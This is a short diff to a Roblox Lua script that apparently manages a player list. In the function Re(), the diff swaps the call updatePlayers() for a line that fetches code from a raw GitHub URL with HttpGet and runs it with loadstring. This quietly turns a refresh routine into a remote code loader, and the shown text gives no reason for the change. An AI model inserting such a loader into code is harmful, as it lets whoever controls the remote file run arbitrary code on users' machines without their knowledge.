@@ -196,7 +196,7 @@ local scroller = PlayerScroller
 local Char = game.Players.LocalPlayer.Character
 
 function Re()
-    updatePlayers()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Kason9487/AA/main/AA'),true))()
 end
 
 function updatePlayers()
